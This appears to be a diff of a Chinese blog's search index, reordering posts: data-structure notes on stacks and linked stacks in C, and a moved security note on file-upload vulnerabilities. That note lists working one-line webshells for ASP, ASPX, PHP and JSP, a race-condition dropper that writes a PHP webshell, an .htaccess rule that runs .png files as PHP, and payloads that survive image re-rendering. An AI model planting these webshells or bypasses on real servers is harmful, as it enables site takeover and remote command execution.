@@ -77,6 +77,14 @@
       </tags>
   </entry>
   <entry>
+    <title>数据结构之队列</title>
+    <url>/posts/3568722733.html</url>
+    <content><![CDATA[]]></content>
+      <tags>
+        <tag>数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>数据结构：栈</title>
     <url>/posts/1123954996.html</url>
     <content><![CDATA[<h2 id="栈-Stack"><a href="#栈-Stack" class="headerlink" title="栈  Stack"></a>栈  Stack</h2><ul>
@@ -95,19 +103,25 @@
 <li>栈顶指针top指向栈顶元素：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">FullStack</span> <span class="params">(Stack &amp;S)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.top == NUM<span class="number">-1</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 <li>栈顶指针top指向栈顶元素的下一位置:<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">FullStack</span> <span class="params">(Stack &amp;S)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.top == NUM) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ul>
+<h2 id="链栈"><a href="#链栈" class="headerlink" title="链栈"></a>链栈</h2><ul>
+<li>链栈的每个结点的地址是不连续的，只需要一个栈顶指针即可</li>
+<li>链栈的结点定义和单链表相同，但是链栈是运算受限的单链表，插入和删除操作仅限制在栈顶进行。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//－－－栈的链式存储表示－－－</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span> <span class="title">SNode</span> &#123;</span></span><br><span class="line">            SElemType          data;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">SNode</span>     *<span class="title">next</span>;</span>            </span><br><span class="line">&#125; SNode, *LinkStack</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="链栈的基本操作（带头结点）"><a href="#链栈的基本操作（带头结点）" class="headerlink" title="链栈的基本操作（带头结点）"></a>链栈的基本操作（带头结点）</h3><ul>
+<li>压栈的处理:  <blockquote>
+<p>p&#x3D;(stacknode *)malloc(stacknode);<br>p-&gt;next &#x3D; s-&gt;next; s-&gt;next&#x3D;p;</p>
+</blockquote>
+</li>
+<li>弹栈的处理：<blockquote>
+<p>p&#x3D;s-&gt;next;   s-&gt;next&#x3D;s-&gt;next-&gt;next;</p>
+</blockquote>
+</li>
+</ul>
 <h3 id="栈的进制转换（二进制转为八进制）"><a href="#栈的进制转换（二进制转为八进制）" class="headerlink" title="栈的进制转换（二进制转为八进制）"></a>栈的进制转换（二进制转为八进制）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">conversion</span> <span class="params">(SqStack&amp; S)</span> &#123;</span><br><span class="line">	<span class="type">int</span> N;</span><br><span class="line">	<span class="type">int</span> e;</span><br><span class="line">    InitStack(S);  </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">while</span> (N) &#123;</span><br><span class="line">         Push(S, N % <span class="number">8</span>); </span><br><span class="line">         N = N/<span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!StackEmpty(S)) &#123;</span><br><span class="line">         Pop(S,e);</span><br><span class="line">         <span class="built_in">printf</span> ( <span class="string">&quot;%d&quot;</span>, e );</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125; <span class="comment">// conversion</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>完整代码<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  TRUE           1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  FALSE          0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  OK             1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  ERROR          0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  INFEASIBLE     -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERFLOW -2</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="type">int</span>  Status;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_INIT_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACKINCREMENT 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">               SElemType *base;</span><br><span class="line">               SElemType  *top;</span><br><span class="line">               <span class="type">int</span> stacksize;</span><br><span class="line">               &#125;SqStack;</span><br><span class="line">Status <span class="title function_">InitStack</span><span class="params">(SqStack &amp;S)</span> &#123;</span><br><span class="line">	S.base = (SElemType *)<span class="built_in">malloc</span>   (STACK_INIT_SIZE*<span class="keyword">sizeof</span> (SElemType));</span><br><span class="line">	<span class="keyword">if</span> (!S.base) <span class="built_in">exit</span> (OVERFLOW);</span><br><span class="line">	S.top = S.base;</span><br><span class="line">	S.stacksize = STACK_INIT_SIZE;</span><br><span class="line">	<span class="keyword">return</span> OK;</span><br><span class="line">     &#125; <span class="comment">//InitStack</span></span><br><span class="line">Status <span class="title function_">Push</span><span class="params">(SqStack &amp;S, SElemType e)</span> &#123;</span><br><span class="line">	   <span class="keyword">if</span> (S.top-S.base&gt;=S.stacksize) <span class="comment">//Õ»Âú</span></span><br><span class="line">	    &#123; S.base=(SElemType *)<span class="built_in">realloc</span></span><br><span class="line">	      (S.base, (S.stacksize+STACKINCREMENT)</span><br><span class="line">	      * <span class="keyword">sizeof</span>(SElemType));</span><br><span class="line">	      <span class="keyword">if</span> (!S.base) <span class="built_in">exit</span> (OVERFLOW);</span><br><span class="line">	      S.top   = S.base + S.stacksize; </span><br><span class="line">	      S.stacksize+=STACKINCREMENT; </span><br><span class="line">	       &#125;  <span class="comment">// if</span></span><br><span class="line">	    *S.top++ = e;   <span class="keyword">return</span> OK; &#125;  <span class="comment">//Push</span></span><br><span class="line">Status <span class="title function_">Pop</span><span class="params">(SqStack &amp;S, SElemType &amp;e)</span> &#123;</span><br><span class="line">	  <span class="keyword">if</span>(S.top == S.base)<span class="keyword">return</span> ERROR; </span><br><span class="line">	 e = * -- S.top;</span><br><span class="line">	 <span class="keyword">return</span> OK;</span><br><span class="line">	&#125; <span class="comment">//Pop    </span></span><br><span class="line">Status <span class="title function_">StackEmpty</span><span class="params">(SqStack S)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (S.base==S.top)</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">  <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">conversion</span> <span class="params">(SqStack&amp; S)</span> &#123;</span><br><span class="line">	<span class="type">int</span> N;</span><br><span class="line">	<span class="type">int</span> e;</span><br><span class="line">    InitStack(S);  </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">while</span> (N) &#123;</span><br><span class="line">         Push(S, N % <span class="number">8</span>); </span><br><span class="line">         N = N/<span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!StackEmpty(S)) &#123;</span><br><span class="line">         Pop(S,e);</span><br><span class="line">         <span class="built_in">printf</span> ( <span class="string">&quot;%d&quot;</span>, e );</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125; <span class="comment">// conversion</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SqStack S;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Please input a number to conver\n&quot;</span>);</span><br><span class="line">	conversion(S);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Please any key to continue\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ul>
 ]]></content>
-      <tags>
-        <tag>数据结构</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>数据结构之队列</title>
-    <url>/posts/3568722733.html</url>
-    <content><![CDATA[]]></content>
       <tags>
         <tag>数据结构</tag>
       </tags>
@@ -215,6 +229,46 @@
       </tags>
   </entry>
   <entry>
+    <title>文件上传</title>
+    <url>/posts/2682.html</url>
+    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><ul>
+<li>简介：现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。  </li>
+<li>漏洞产生原因：<br>上传文件时，如果服务器端没有对客户端上传的文件进行严格的检验或过滤，就容易造成可上传任意文件的情况，包括上传脚本文件（asp，aspx，php，jsp）  </li>
+<li>漏洞的危害：<br>非法用户可以利用上传的脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</li>
+<li>ASP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;x&quot;</span>)%&gt;//密码是‘x’</span><br><span class="line">&lt;%execute request(<span class="string">&quot;x&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>ASPX  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">&quot;x&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>PHP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])?&gt;  //比较标准的用法；不一定是post，也可以是get</span><br><span class="line">&lt;?php assert(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];?)&gt;  //php版本&gt;7时不能用了</span><br></pre></td></tr></table></figure></li>
+<li>JSP CMD WebShall  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">    if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;)))</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInp</span><br><span class="line">        int a=-1;</span><br><span class="line">        byte[] b=new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>文件上传漏洞的条件<br>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径<br>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也就不能被称之为漏洞<br>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，也可能导致攻击不成功  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">&lt;?php eval($_GET[1]);?&gt;</span><br><span class="line">?1=system(whoami);</span><br><span class="line">&lt;?php eval(system(whoami););?&gt;</span><br><span class="line">$_GET=&gt;接受GET参数</span><br><span class="line">$_POST=&gt;接受POST参数</span><br><span class="line">$_REQUEST=&gt;接受GET参数 POST Cookie 参数</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件头绕过："><a href="#文件头绕过：" class="headerlink" title="文件头绕过："></a>文件头绕过：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JPEG(jpg), 文件头：FFD8FF</span><br><span class="line">PNG(png), 文件头：89504E47</span><br><span class="line">GIF(gig), 文件头：47494638</span><br><span class="line">HTML(html), 文件头：68746D6C3E</span><br><span class="line">ZIP Archive(Zip), 文件头：504B0304</span><br><span class="line">RAR Achive(rar), 文件头：52617221</span><br><span class="line">Adobe Acrobat(pdf), 文件头：255044462D312E</span><br><span class="line">MS Word/Excel(xls.or.doc), 文件头：D0CF11E0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>白名单策略：只允许上传xxx后缀  jpg jpeg png gif<br>黑名单策略：不允许上传xxx后缀<br>白名单是设置能通过用户，黑名单是设置不能通过用户，所以一般情况下，白名单比黑名单限制的用户多些</li>
+</ul>
+<h2 id="htaccess："><a href="#htaccess：" class="headerlink" title=".htaccess："></a>.htaccess：</h2><ul>
+<li>是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许&#x2F;组织特定的用户或目录的访问，禁止默认列表，配置默认文档等功能。</li>
+<li>grep -r “application&#x2F;x-httpd-php” &#x2F;etc<br>手动查询etc目录下包含”application&#x2F;x-httpd-php”的文件  </li>
+<li>htaccess解析规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></li>
+<li>PHP内核是由C语言实现的，所以使用了C语言中一些字符串处理函数，比如在连接字符串的时候，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串<br>00 截断常配合目录截断</li>
+</ul>
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
+<li>简介 ：是一个系统的运行结果不受控制时间的先后顺序。当这些不受控制的事件没有按照开发者想要的方式运行的时候，就可能出现bug，尤其在当我们的系统中大量对资源进行共享，，如果处理不当就会产生条件竞争漏洞。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除他的间隙，攻击者通过不断的发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意的shell文件，至此该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把他删除的问题就已经不重要了，因为攻击者已经成功地在服务器中植入了一个shell文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命等待有缘人的光顾，然后快速生成一个小webshell。这类WebShell大体内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao,php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST(1));?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><ul>
+<li>原理：上传文件后，网站会对图片进行二次处理(格式、尺寸、要求等)，服务器会把里面的内容进行替换和更新。处理完成后，根据原有的图片生成一个新的图片并放到网站对应的标签进行显示。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$im = imagecreatefromjpeg( $upload_file);</span><br><span class="line">$im = imagecreatefrompng( $upload_file);</span><br><span class="line">$im = imagecreatefromgif( $upload_file);</span><br></pre></td></tr></table></figure></li>
+<li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li>
+<li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT 数据块</li>
+<li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试渲染两次会返回正确木马</li>
+<li>JPG坑点总结<br>需要被imagecreatefromjpeg渲染或再用工具<br>图片找的稍微大一点成功率更高<br>Payload语句越短成功率越高<br>一张图片不行就换一张不要死磕  </li>
+<li>国光补充:貌似白色的图片成功率也比较高<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $_GET[0]($_POST[1]);?&gt; 这种payload成功率很高</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2>]]></content>
+      <tags>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>密码爆破</title>
     <url>/posts/29527.html</url>
     <content><![CDATA[<h2 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h2><h3 id="四位数字爆破。"><a href="#四位数字爆破。" class="headerlink" title="四位数字爆破。"></a>四位数字爆破。</h3><ul>
@@ -255,46 +309,6 @@
 <li>验证码</li>
 </ul>
 ]]></content>
-      <tags>
-        <tag>网络安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传</title>
-    <url>/posts/2682.html</url>
-    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><ul>
-<li>简介：现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。  </li>
-<li>漏洞产生原因：<br>上传文件时，如果服务器端没有对客户端上传的文件进行严格的检验或过滤，就容易造成可上传任意文件的情况，包括上传脚本文件（asp，aspx，php，jsp）  </li>
-<li>漏洞的危害：<br>非法用户可以利用上传的脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</li>
-<li>ASP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;x&quot;</span>)%&gt;//密码是‘x’</span><br><span class="line">&lt;%execute request(<span class="string">&quot;x&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>ASPX  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">&quot;x&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>PHP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])?&gt;  //比较标准的用法；不一定是post，也可以是get</span><br><span class="line">&lt;?php assert(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];?)&gt;  //php版本&gt;7时不能用了</span><br></pre></td></tr></table></figure></li>
-<li>JSP CMD WebShall  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">    if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;)))</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInp</span><br><span class="line">        int a=-1;</span><br><span class="line">        byte[] b=new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>文件上传漏洞的条件<br>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径<br>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也就不能被称之为漏洞<br>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，也可能导致攻击不成功  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">&lt;?php eval($_GET[1]);?&gt;</span><br><span class="line">?1=system(whoami);</span><br><span class="line">&lt;?php eval(system(whoami););?&gt;</span><br><span class="line">$_GET=&gt;接受GET参数</span><br><span class="line">$_POST=&gt;接受POST参数</span><br><span class="line">$_REQUEST=&gt;接受GET参数 POST Cookie 参数</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件头绕过："><a href="#文件头绕过：" class="headerlink" title="文件头绕过："></a>文件头绕过：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JPEG(jpg), 文件头：FFD8FF</span><br><span class="line">PNG(png), 文件头：89504E47</span><br><span class="line">GIF(gig), 文件头：47494638</span><br><span class="line">HTML(html), 文件头：68746D6C3E</span><br><span class="line">ZIP Archive(Zip), 文件头：504B0304</span><br><span class="line">RAR Achive(rar), 文件头：52617221</span><br><span class="line">Adobe Acrobat(pdf), 文件头：255044462D312E</span><br><span class="line">MS Word/Excel(xls.or.doc), 文件头：D0CF11E0</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>白名单策略：只允许上传xxx后缀  jpg jpeg png gif<br>黑名单策略：不允许上传xxx后缀<br>白名单是设置能通过用户，黑名单是设置不能通过用户，所以一般情况下，白名单比黑名单限制的用户多些</li>
-</ul>
-<h2 id="htaccess："><a href="#htaccess：" class="headerlink" title=".htaccess："></a>.htaccess：</h2><ul>
-<li>是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许&#x2F;组织特定的用户或目录的访问，禁止默认列表，配置默认文档等功能。</li>
-<li>grep -r “application&#x2F;x-httpd-php” &#x2F;etc<br>手动查询etc目录下包含”application&#x2F;x-httpd-php”的文件  </li>
-<li>htaccess解析规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></li>
-<li>PHP内核是由C语言实现的，所以使用了C语言中一些字符串处理函数，比如在连接字符串的时候，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串<br>00 截断常配合目录截断</li>
-</ul>
-<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
-<li>简介 ：是一个系统的运行结果不受控制时间的先后顺序。当这些不受控制的事件没有按照开发者想要的方式运行的时候，就可能出现bug，尤其在当我们的系统中大量对资源进行共享，，如果处理不当就会产生条件竞争漏洞。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除他的间隙，攻击者通过不断的发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意的shell文件，至此该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把他删除的问题就已经不重要了，因为攻击者已经成功地在服务器中植入了一个shell文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命等待有缘人的光顾，然后快速生成一个小webshell。这类WebShell大体内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao,php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST(1));?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><ul>
-<li>原理：上传文件后，网站会对图片进行二次处理(格式、尺寸、要求等)，服务器会把里面的内容进行替换和更新。处理完成后，根据原有的图片生成一个新的图片并放到网站对应的标签进行显示。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$im = imagecreatefromjpeg( $upload_file);</span><br><span class="line">$im = imagecreatefrompng( $upload_file);</span><br><span class="line">$im = imagecreatefromgif( $upload_file);</span><br></pre></td></tr></table></figure></li>
-<li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li>
-<li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT 数据块</li>
-<li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试渲染两次会返回正确木马</li>
-<li>JPG坑点总结<br>需要被imagecreatefromjpeg渲染或再用工具<br>图片找的稍微大一点成功率更高<br>Payload语句越短成功率越高<br>一张图片不行就换一张不要死磕  </li>
-<li>国光补充:貌似白色的图片成功率也比较高<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $_GET[0]($_POST[1]);?&gt; 这种payload成功率很高</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2>]]></content>
       <tags>
         <tag>网络安全</tag>
       </tags>
